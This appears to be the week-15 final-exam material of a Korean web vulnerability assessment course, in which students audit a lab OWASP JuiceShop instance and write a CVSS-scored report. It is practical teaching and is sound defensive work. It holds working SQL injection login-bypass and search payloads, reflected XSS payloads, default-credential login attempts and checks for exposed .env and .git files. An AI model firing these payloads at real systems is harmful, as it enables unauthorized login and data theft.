# Week 15: 기말 -- 종합 웹취약점 점검 프로젝트

## 학습 목표
- 14주간 배운 모든 점검 기법을 종합하여 실제 웹 애플리케이션을 점검한다
- 전문 수준의 취약점 점검 보고서를 작성한다
- OWASP Testing Guide 기반 체계적 점검 절차를 수행한다
- 점검 계획 수립부터 보고서 제출까지 전 사이클을 경험한다

## 전제 조건
- Week 01~14 전체 내용 숙지
- 점검 보고서 작성 경험 (Week 14)

---

## 1. 기말 시험 구성 (10분)

### 대상: JuiceShop (http://10.20.30.80:3000)

### 점검 범위
1. 정보수집 (Week 03)
2. 인증/세션 관리 (Week 04)
3. SQL Injection (Week 05)
4. XSS/CSRF (Week 06)
5. 파일/명령어 주입 (Week 07)
6. 접근제어 (Week 09)
7. 암호화/통신 보안 (Week 10)
8. 에러 처리/정보 노출 (Week 11)
9. API 보안 (Week 12)

### 채점 기준 (100점)

| 항목 | 배점 | 기준 |
|------|------|------|
| 취약점 발견 수 | 30점 | 10개 이상 만점 |
| CVSS 점수 정확성 | 15점 | 각 취약점 CVSS 산정 |
| 재현 절차 | 20점 | 명령어 단위 재현 가능 |
| 권고사항 | 15점 | 실현 가능한 보완 방안 |
| 보고서 품질 | 20점 | 체계적 구성, 명확한 서술 |

---

## 2. Phase 1: 점검 계획 수립 (20분)

### 2.1 대상 시스템 정보 수집

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== 점검 대상 시스템 정보 ==="

echo "--- 서비스 상태 ---"
curl -s -o /dev/null -w "JuiceShop: HTTP %{http_code}\n" http://localhost:3000/
curl -sI http://localhost:3000/ | grep -iE "^(server|x-powered|content-type):"

echo ""
echo "--- API 엔드포인트 탐색 ---"
for ep in rest/products/search?q= api/Users api/Products api/Challenges api-docs ftp; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$ep)
  echo "  /$ep -> HTTP $CODE"
done

echo ""
echo "--- 기술 스택 식별 ---"
curl -s http://localhost:3000/package.json 2>/dev/null | python3 -c "
import json,sys
try:
    d = json.load(sys.stdin)
    print(f'  앱: {d.get(\"name\",\"?\")} v{d.get(\"version\",\"?\")}')
    deps = d.get('dependencies',{})
    for k in list(deps.keys())[:5]:
        print(f'  의존성: {k} {deps[k]}')
except: print('  package.json 파싱 실패')
" 2>/dev/null
ENDSSH
```

### 2.2 점검 계획서 작성

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
python3 << 'PYEOF'
from datetime import datetime

plan = f"""
================================================================
           웹 취약점 점검 계획서
================================================================
프로젝트: 기말 종합 점검
대상: OWASP JuiceShop (http://10.20.30.80:3000)
일시: {datetime.now().strftime('%Y-%m-%d')}
점검자: (학번/이름)
방법론: OWASP Testing Guide v4.2

점검 범위:
  - 웹 프런트엔드 (Angular SPA)
  - REST API (/rest/*, /api/*)
  - 인증/세션 관리
  - 파일 업로드/다운로드
  범위 제외: OS, 네트워크, DoS

일정:
  - 정보 수집: 20분
  - 취약점 점검: 60분
  - 보고서 작성: 40분
  - 검토/발표: 20분

안전 수칙:
  - 승인된 대상만 점검
  - DoS 공격 금지
  - 발견된 민감 데이터 즉시 삭제
================================================================
"""
print(plan)
PYEOF
ENDSSH
```

---

## 3. Phase 2: 정보 수집 (20분)

### 3.1 보안 헤더 및 설정 점검

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== 보안 헤더 점검 ==="
HEADERS=$(curl -sI http://localhost:3000/)

for hdr in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" \
           "Strict-Transport-Security" "X-XSS-Protection" "Referrer-Policy"; do
  if echo "$HEADERS" | grep -qi "$hdr"; then
    echo "[OK] $(echo "$HEADERS" | grep -i "$hdr" | head -1 | tr -d '\r')"
  else
    echo "[MISSING] $hdr"
  fi
done

echo ""
echo "=== 디렉토리/파일 노출 점검 ==="
for path in ".git/HEAD" ".env" "package.json" "robots.txt" "api-docs" "ftp"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
  if [ "$CODE" = "200" ]; then
    echo "[EXPOSED] /$path (HTTP $CODE)"
  else
    echo "[SAFE] /$path (HTTP $CODE)"
  fi
done
ENDSSH
```

### 3.2 HTTP 메서드 및 서버 정보

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== HTTP 메서드 점검 ==="
for method in GET POST PUT DELETE OPTIONS TRACE PATCH; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/api/Products)
  echo "  $method /api/Products -> HTTP $CODE"
done

echo ""
echo "=== 디폴트 계정 점검 ==="
for cred in "admin@juice-sh.op:admin123" "admin:admin" "test@test.com:test"; do
  IFS=":" read -r email pass <<< "$cred"
  RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"$pass\"}")
  if echo "$RESULT" | grep -q "authentication"; then
    echo "  [VULN] $email / $pass -> 로그인 성공"
  else
    echo "  [SAFE] $email / $pass -> 실패"
  fi
done
ENDSSH
```

---

## 4. Phase 3: 취약점 점검 (60분)

### 4.1 SQL Injection 점검

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== SQL Injection 점검 ==="

echo "--- 로그인 SQLi ---"
RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}')
if echo "$RESULT" | grep -q "authentication"; then
  echo "[CRITICAL] 로그인 SQLi -> 인증 우회 성공"
  echo "$RESULT" | python3 -c "
import json,sys
d = json.load(sys.stdin)
auth = d.get('authentication',{})
print(f'  이메일: {auth.get(\"umail\",\"N/A\")}')
print(f'  토큰: {auth.get(\"token\",\"\")[:40]}...')
" 2>/dev/null
else
  echo "[SAFE] 로그인 SQLi 차단"
fi

echo ""
echo "--- 검색 SQLi ---"
NORMAL=$(curl -s "http://localhost:3000/rest/products/search?q=apple" | wc -c)
SQLI=$(curl -s "http://localhost:3000/rest/products/search?q='+OR+1=1--" | wc -c)
echo "  정상: ${NORMAL}B / SQLi: ${SQLI}B"
[ "$SQLI" -gt "$NORMAL" ] && echo "  [HIGH] 검색 SQLi 취약" || echo "  [SAFE] 검색 SQLi 안전"
ENDSSH
```

### 4.2 XSS 및 접근제어 점검

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== XSS 점검 ==="
XSS_PAYLOADS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>")

for payload in "${XSS_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  RESP=$(curl -s "http://localhost:3000/rest/products/search?q=${ENCODED}")
  if echo "$RESP" | grep -qF "$payload"; then
    echo "  [HIGH] 반사형 XSS: $payload"
  else
    echo "  [SAFE] 필터됨: $payload"
  fi
done

echo ""
echo "=== 접근제어 점검 ==="
echo "--- 인증 없이 API 접근 ---"
for ep in "api/Users" "api/Challenges" "api/Quantitys"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/$ep")
  echo "  /$ep -> HTTP $CODE"
  [ "$CODE" = "200" ] && echo "    [MEDIUM] 인증 없이 접근 가능"
done

echo ""
echo "--- 패스워드 정책 ---"
for pw in "1" "abc" "a"; do
  RESULT=$(curl -s -X POST http://localhost:3000/api/Users/ \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"pwtest_$(date +%s%N)@t.com\",\"password\":\"$pw\",\"passwordRepeat\":\"$pw\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"a\"}")
  if echo "$RESULT" | grep -q "\"id\""; then
    echo "  [MEDIUM] 약한 패스워드 허용: '$pw'"
  fi
done
ENDSSH
```

### 4.3 인증 및 세션 점검

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
echo "=== 계정 잠금 정책 점검 ==="
echo "5회 연속 실패 시도..."
for i in $(seq 1 5); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
  echo "  시도 $i: HTTP $CODE"
done
echo "  -> 5회 실패 후에도 계정 잠금 없으면 [MEDIUM] 취약"

echo ""
echo "=== JWT 토큰 분석 ==="
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)

if [ -n "$TOKEN" ] && [ "$TOKEN" != "" ]; then
  echo "$TOKEN" | cut -d. -f2 | python3 -c "
import base64, sys, json
token_part = sys.stdin.read().strip()
padding = 4 - len(token_part) % 4
decoded = base64.urlsafe_b64decode(token_part + '=' * padding)
payload = json.loads(decoded)
print(f'  알고리즘 확인 필요 (none 취약점)')
print(f'  사용자: {payload.get(\"data\",{}).get(\"email\",\"N/A\")}')
print(f'  역할: {payload.get(\"data\",{}).get(\"role\",\"N/A\")}')
" 2>/dev/null
fi
ENDSSH
```

---

## 5. Phase 4: 보고서 작성 (40분)

### 5.1 보고서 형식

```markdown
# 웹 취약점 점검 보고서

## 1. 개요
- 점검 대상, 범위, 기간, 점검자

## 2. 총평
- 전체 취약점 현황 요약, 위험도 분포

## 3. 취약점 상세
### 3.1 [취약점명]
- 위험도: Critical/High/Medium/Low
- CVSS: X.X
- 위치: URL/파라미터
- 재현 절차: (명령어 단위)
- 영향:
- 권고사항:

## 4. 결론 및 권고
```

### 5.2 종합 보고서 자동 생성

```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.80 << 'ENDSSH'
python3 << 'PYEOF'
from datetime import datetime

findings = [
    {"id":"V-001","name":"SQL Injection (로그인 우회)","severity":"Critical","cvss":9.8,
     "cwe":"CWE-89","location":"POST /rest/user/login (email)",
     "fix":"Parameterized Query 또는 ORM 사용"},
    {"id":"V-002","name":"XSS (검색 반사형)","severity":"High","cvss":7.1,
     "cwe":"CWE-79","location":"GET /rest/products/search (q)",
     "fix":"출력 인코딩, CSP 헤더"},
    {"id":"V-003","name":"API 접근제어 부재","severity":"Medium","cvss":5.3,
     "cwe":"CWE-284","location":"GET /api/Users",
     "fix":"JWT 인증 필수화"},
    {"id":"V-004","name":"약한 패스워드 정책","severity":"Medium","cvss":5.3,
     "cwe":"CWE-521","location":"POST /api/Users",
     "fix":"최소 8자, 복잡도 요구"},
    {"id":"V-005","name":"보안 헤더 누락","severity":"Medium","cvss":4.3,
     "cwe":"CWE-693","location":"전체 응답",
     "fix":"CSP, X-Frame-Options 등 헤더 추가"},
    {"id":"V-006","name":"계정 잠금 부재","severity":"Medium","cvss":5.3,
     "cwe":"CWE-307","location":"POST /rest/user/login",
     "fix":"5회 실패 시 잠금 또는 CAPTCHA"},
    {"id":"V-007","name":"package.json 노출","severity":"Low","cvss":3.1,
     "cwe":"CWE-200","location":"GET /package.json",
     "fix":"정적 파일 접근 제한"},
]

stats = {}
for f in findings:
    s = f["severity"]
    stats[s] = stats.get(s, 0) + 1

report = f"""
{'='*70}
          종합 웹 취약점 점검 보고서
{'='*70}
프로젝트: 기말 종합 점검
대상: OWASP JuiceShop (http://10.20.30.80:3000)
일시: {datetime.now().strftime('%Y-%m-%d %H:%M')}
방법론: OWASP Testing Guide v4.2

1. 요약
   총 발견: {len(findings)}건
"""
for sev in ["Critical","High","Medium","Low"]:
    report += f"     {sev}: {stats.get(sev,0)}건\n"

report += f"\n2. 발견사항 상세\n{'~'*60}\n"

for f in findings:
    report += f"""
[{f['id']}] {f['name']}
  심각도: {f['severity']} (CVSS {f['cvss']})
  CWE: {f['cwe']}
  위치: {f['location']}
  권고: {f['fix']}
"""

report += f"""
{'~'*60}

3. 권고사항 우선순위
   [즉시] V-001 SQL Injection 수정
   [즉시] V-002 XSS 출력 인코딩
   [단기] V-003 API 인증 강화
   [단기] V-004 패스워드 정책
   [단기] V-006 계정 잠금 정책
   [일반] V-005 보안 헤더
   [일반] V-007 파일 노출 차단

{'='*70}
"""
print(report)
PYEOF
ENDSSH
```

---

## 6. OpsClaw 연동 실습

### 6.1 OpsClaw로 점검 자동화

```bash
export OPSCLAW_API_KEY=opsclaw-api-key-2026

# 1. 프로젝트 생성
echo "=== OpsClaw 프로젝트 생성 ==="
PROJECT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{"name":"final-vuln-assessment","request_text":"기말 종합 점검","master_mode":"external"}')
PID=$(echo "$PROJECT" | python3 -c "import json,sys; print(json.load(sys.stdin)['id'])")
echo "Project ID: $PID"

# 2. Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null

# 3. 점검 실행 (evidence 자동 기록)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {"order":1,"instruction_prompt":"curl -sI http://localhost:3000/ | head -15","risk_level":"low"},
      {"order":2,"instruction_prompt":"curl -s -X POST http://localhost:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"'"'"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" | head -5","risk_level":"low"}
    ],
    "subagent_url": "http://192.168.208.151:8002"
  }' | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'결과: {len(d.get(\"results\",[]))}건')" 2>/dev/null

# 4. evidence 확인
echo ""
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -c "import json,sys; print(json.dumps(json.load(sys.stdin), indent=2, ensure_ascii=False)[:300])" 2>/dev/null
```

### 6.2 LLM 기반 보고서 품질 검증

```bash
curl -s http://192.168.0.105:11434/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gemma3:12b",
    "messages": [
      {"role": "system", "content": "보안 컨설팅 심사관입니다. 취약점 점검 보고서를 평가합니다. 한국어로."},
      {"role": "user", "content": "다음 취약점 기술의 품질을 10점 만점으로 평가하세요:\n\n[V-001] SQL Injection (로그인 우회)\n심각도: Critical (CVSS 9.8)\nCWE: CWE-89\n위치: POST /rest/user/login (email 파라미터)\n재현: Body={\"email\":\"'"'"' OR 1=1--\",\"password\":\"x\"} -> 인증 토큰 발급\n권고: Parameterized Query 사용\n\n1) 재현성 2) 영향 분석 3) 권고 구체성 4) 전체 점수"}
    ],
    "temperature": 0.3
  }' | python3 -c "import json,sys; print(json.load(sys.stdin)['choices'][0]['message']['content'])"
```

---

## 7. 과목 총정리

### 7.1 15주 학습 맵

```
Week 01-02: 기초         -> 점검 개론, 도구 환경 구축
Week 03-04: 정보수집/인증 -> 디렉토리 스캔, 세션 관리
Week 05-07: 입력값 검증   -> SQLi, XSS, CSRF, 파일 업로드
Week 08:    중간고사      -> JuiceShop 점검 보고서
Week 09-12: 고급 점검     -> 접근제어, 암호화, 에러, API
Week 13-14: 도구/보고서   -> 자동화 도구, CVSS, 보고서
Week 15:    기말          -> 종합 점검 프로젝트
```

### 7.2 핵심 역량 자가 진단

| 역량 | 확인 |
|------|------|
| 대상 시스템의 기술 스택을 식별할 수 있는가? | |
| 블라인드 SQLi를 포함한 다양한 SQLi를 점검할 수 있는가? | |
| 반사형/저장형/DOM XSS를 구분하고 점검할 수 있는가? | |
| IDOR, 수직/수평 권한 상승을 점검할 수 있는가? | |
| REST API 인증/인가를 체계적으로 점검할 수 있는가? | |
| 점검 스크립트를 작성하고 결과를 분석할 수 있는가? | |
| CVSS 기반 전문 보고서를 작성할 수 있는가? | |

---

## 제출물
1. 취약점 점검 보고서 (PDF 또는 Markdown)
2. OpsClaw 프로젝트 ID (evidence 자동 확인용)
3. 재현 스크립트 (모든 취약점 재현 가능)

---

## 핵심 정리

1. 웹취약점 점검은 계획-수집-점검-보고의 체계적 사이클이다
2. OWASP Testing Guide는 산업 표준 점검 방법론이다
3. 자동 도구와 수동 점검을 조합하면 최적의 결과를 얻는다
4. 보고서는 재현성, 영향 분석, 구체적 권고사항이 핵심이다
5. 점검은 반드시 승인된 범위 내에서 윤리적으로 수행한다

## 다음 학기 예고
보안시스템 운영 (Course 2) 또는 보안관제 (Course 5) 수강 권장
